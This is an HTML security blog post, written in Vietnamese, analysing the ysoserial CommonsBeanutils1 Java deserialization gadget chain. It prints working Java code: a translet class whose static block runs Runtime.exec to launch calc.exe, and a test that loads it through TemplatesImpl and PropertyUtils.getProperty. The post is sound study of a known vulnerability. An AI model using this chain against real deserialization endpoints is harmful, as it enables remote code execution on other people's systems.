@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>[Java Deserialization] CommonsBeanutils1 exploit chain analysis - quactv</title><meta name="Description" content="quactv blog"><meta property="og:title" content="[Java Deserialization] CommonsBeanutils1 exploit chain analysis" />
+<meta property="og:description" content="Các lỗ hổng liên quan tới deserialization trên Java đã trở thành một vấn đề bảo mật nóng trong những năm gần đây. Quá trình deserialize không an toàn có thể dẫn đến các lỗ hổng nghiêm trọng như thực thi mã từ xa. Ysoserial là một dự án được tạo bởi frohoff, một người phát hiện ra lỗ hổng deserialization trên Java. Bài viết này sẽ phân tích về chain CommonsBeanutils1" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tranquac.github.io/posts/cb1-java-deser/" /><meta property="og:image" content="https://tranquac.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-19T18:17:00&#43;07:00" />
+<meta property="article:modified_time" content="2022-01-19T18:17:00&#43;07:00" /><meta property="og:site_name" content="quactv blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://tranquac.github.io/logo.png"/>
+
+<meta name="twitter:title" content="[Java Deserialization] CommonsBeanutils1 exploit chain analysis"/>
+<meta name="twitter:description" content="Các lỗ hổng liên quan tới deserialization trên Java đã trở thành một vấn đề bảo mật nóng trong những năm gần đây. Quá trình deserialize không an toàn có thể dẫn đến các lỗ hổng nghiêm trọng như thực thi mã từ xa. Ysoserial là một dự án được tạo bởi frohoff, một người phát hiện ra lỗ hổng deserialization trên Java. Bài viết này sẽ phân tích về chain CommonsBeanutils1"/>
+<meta name="application-name" content="quactv blog">
+<meta name="apple-mobile-web-app-title" content="quactv blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://tranquac.github.io/posts/cb1-java-deser/" /><link rel="prev" href="https://tranquac.github.io/posts/introduce-java-serialize/" /><link rel="next" href="https://tranquac.github.io/posts/oswe-review/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[Java Deserialization] CommonsBeanutils1 exploit chain analysis",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/tranquac.github.io\/posts\/cb1-java-deser\/"
+        },"genre": "posts","keywords": "Java, Code","wordcount":  730 ,
+        "url": "https:\/\/tranquac.github.io\/posts\/cb1-java-deser\/","datePublished": "2022-01-19T18:17:00+07:00","dateModified": "2022-01-19T18:17:00+07:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "quactv"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="quactv">&gt; root@quactv:~#</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/write-up/"> Write-up </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About me </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="quactv">&gt; root@quactv:~#</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/write-up/" title="">Write-up</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[Java Deserialization] CommonsBeanutils1 exploit chain analysis</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>quactv</a></span>&nbsp;<span class="post-category">included in <a href="/categories/offensive-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Offensive Security</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-19">2022-01-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;730 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#gadget-chain">Gadget chain</a></li>
+        <li><a href="#phân-tích">Phân tích</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Các lỗ hổng liên quan tới deserialization trên Java đã trở thành một vấn đề bảo mật nóng trong những năm gần đây. Quá trình deserialize không an toàn có thể dẫn đến các lỗ hổng nghiêm trọng như thực thi mã từ xa. Ysoserial là một dự án được tạo bởi frohoff, một người phát hiện ra lỗ hổng deserialization trên Java. Bài viết này sẽ phân tích về chain CommonsBeanutils1</p>
+<p>Apache Commons Beanutils là một dự án khác thuộc bộ công cụ Apache Commons cung cấp một số phương thức thao tác trên các đối tượng lớp Java thông thường (còn được gọi là JavaBeans).</p>
+<h3 id="gadget-chain">Gadget chain</h3>
+<pre><code>ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                siftDownUsingComparator()
+                    BeanComparator.compare()
+                        TemplatesImpl.getOutputProperties()
+                            TemplatesImpl.newTransformer()
+                                TemplatesImpl.getTransletInstance()
+                                    TemplatesImpl.defineTransletClasses()
+                                        TemplatesImpl.TransletClassLoader.defineClass()
+                                            Pwner*(Javassist-generated).&lt;static init&gt;
+                                                Runtime.exec()
+</code></pre><h3 id="phân-tích">Phân tích</h3>
+<p>Ví dụ, đây là lớp JavaBean đơn giản nhất</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg" /></p>
+<p>Commons-beanutils cung cấp một phương thức tĩnh PropertyUtils.getProperty cho phép người dùng gọi trực tiếp phương thức getter của bất kỳ JavaBean nào, chẳng hạn như:</p>
+<pre><code>PropertyUtils.getProperty (Object bean, String name)
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg" /></p>
+<p>Lúc này, commons-beanutils sẽ tự động tìm phương thức getter của thuộc tính name, tức là getName, rồi gọi nó để lấy giá trị trả về. Bằng cách này, người dùng có thể dễ dàng gọi getter của bất kỳ đối tượng nào.</p>
+<p>Trong phương thức so sánh của lớp BeanComparator, có một lệnh gọi đến hàm PropertyUtils.getProperty, được thực hiện như sau:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg" /></p>
+<p>Phương thức này truyền vào 2 đối tượng. Nếu this.property là null thì so sánh hai objects trực tiếp với nhau, ngược lại this.property khác null, sẽ sử dụng PropertyUtils.getProperty để lấy giá trị property của hai đối tượng và so sánh chúng với nhau. Như đã nói ở trên, PropertyUtils.getProperty sẽ tự động gọi phương thức getter của JavaBean, đây là key để thực thi code tuỳ ý.</p>
+<p>Vậy có bất kì phương thức getter nào có thể thực thi mã tuỳ ý không?</p>
+<p><strong>TemplatesImpl chain</strong></p>
+<pre><code>TemplatesImpl#getOutputProperties -&gt;
+TemplatesImpl#newTransformer() -&gt;
+TemplatesImpl#getTransletInstance() -&gt; 
+TemplatesImpl#defineTransletClasses()-&gt; 
+TransletClassLoader#defineClass()
+</code></pre><p>Chain thức này đã được tìm thấy trước đó. PropertyUtils.getProperty(o1, property) : Khi o1 được truyền vào là một TemplatesImpl object và property có giá trị là outputProperties, phương thức getter sẽ tự động gọi để thực thi phương thức TemplatesImpl#getOutputProperties(). Trong nội bộ TemplatesImpl#getOutputProperties() nó lại gọi đến newTransformer()</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg" /></p>
+<p>Mà TemplatesImpl#newTransformer() thường được sử dụng để thực thi bytecodes độc hại:</p>
+<pre><code>TemplatesImpl#newTransformer() -&gt;
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg" /></p>
+<p>TemplatesImpl#getTransletInstance() -&gt;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg" /></p>
+<p>TemplatesImpl#defineTransletClasses()-&gt;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg" /></p>
+<p>TransletClassLoader#defineClass()</p>
+<p>Xây dựng TemplatesImpl</p>
+<pre><code>TemplatesImpl templates = new TemplatesImpl();
+setFieldValue(templates,&quot;_name&quot;, &quot;Pwnr&quot;);
+setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]{malicious_bytes});
+PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg" /></p>
+<p>Và sau đó truyền đối tượng TemplatesImpl vừa tạo vào BeanComparator</p>
+<pre><code>BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);
+</code></pre><p><strong>PriorityQueue</strong></p>
+<p>ReadObject trong PriorityQueue sẽ gọi hàm heapify để sắp xếp các phần tử, sau đó kích hoạt phương thức comparator.compare tạo nên một chuỗi hoàn hảo. Chắc vẫn còn cách khác để trigger được comparator.compare nhưng trong gadget chain này tác giả đã sử dụng cách thức này. Càng phân tích càng thấy hâm mộ những con người đi trước sao có thể tìm được như vậy.</p>
+<pre><code>final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg" /></p>
+<p>Chain hoàn chỉnh:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg" /></p>
+<p>Hoàn hảo!</p>
+<p>Code thao khảo:</p>
+<p><strong>RunCmd.class</strong></p>
+<pre><code>package com.summer.cb1;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+
+public class RunCmd extends AbstractTranslet{
+    static {
+        try {
+            Runtime.getRuntime().exec(new String[]{&quot;cmd&quot;,&quot;/c&quot;,&quot;calc.exe&quot;});
+        } catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+
+</code></pre><p><strong>TempletesTest class</strong></p>
+<pre><code>package com.summer.cb1;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import org.apache.commons.beanutils.PropertyUtils;
+import org.junit.Test;
+
+import java.lang.reflect.Field;
+
+public class TempletesTest {
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static byte[] classToBytes() throws Exception{
+        byte[] bytes = ClassPool.getDefault().get(RunCmd.class.getName()).toBytecode();
+        return bytes;
+    }
+
+    @Test
+    public void test() throws Exception{
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates,&quot;_name&quot;, &quot;Pwnr&quot;);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]{classToBytes()});
+        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);
+    }
+
+    
+}
+
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg"
+        data-srcset="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg 1.5x, https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg"
+        title="https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg" /></p>
+<p>Học được:</p>
+<ul>
+<li>Kĩ năng nghiên cứu, phân tích vấn đề</li>
+<li>Học được nhiều điều về java và phân tích gadget chain trong java deserialization.</li>
+</ul>
+<p>Ngày đầu ngồi đọc không hiểu gì. Ngày 2 bắt đầu vào phân tích thấy rất hay và vỡ ra nhiều điều. Mình sẽ phân tích các gadget chain khác hoặc một CVE nào đó về java deserialization trong thời gian tới.</p>
+<p>Tham khảo (Để hiểu được không biết tôi đã đọc bao nhiêu bài viết của các pháp sư Trung Hoa nữa!)</p>
+<p>Cảm ơn bạn đã đọc tới đây!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-01-19</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://tranquac.github.io/posts/cb1-java-deser/" data-title="[Java Deserialization] CommonsBeanutils1 exploit chain analysis" data-via="quactv1" data-hashtags="Java,Code"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://tranquac.github.io/posts/cb1-java-deser/" data-hashtag="Java"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://tranquac.github.io/posts/cb1-java-deser/" data-title="[Java Deserialization] CommonsBeanutils1 exploit chain analysis"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://tranquac.github.io/posts/cb1-java-deser/" data-title="[Java Deserialization] CommonsBeanutils1 exploit chain analysis"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://tranquac.github.io/posts/cb1-java-deser/" data-title="[Java Deserialization] CommonsBeanutils1 exploit chain analysis"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java/">Java</a>,&nbsp;<a href="/tags/code/">Code</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/introduce-java-serialize/" class="prev" rel="prev" title="[Java Deserialization] Thảo luận về cơ chế Serialize và Deserialize trong Java"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>[Java Deserialization] Thảo luận về cơ chế Serialize và Deserialize trong Java</a>
+            <a href="/posts/oswe-review/" class="next" rel="next" title="Getting the OSWE Certification: &#39;Offensive Security Web Expert&#39; (PEN-300) review">Getting the OSWE Certification: 'Offensive Security Web Expert' (PEN-300) review<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">quactv</a></span>&nbsp;|&nbsp;<span class="license">Infosec</span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">Security</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
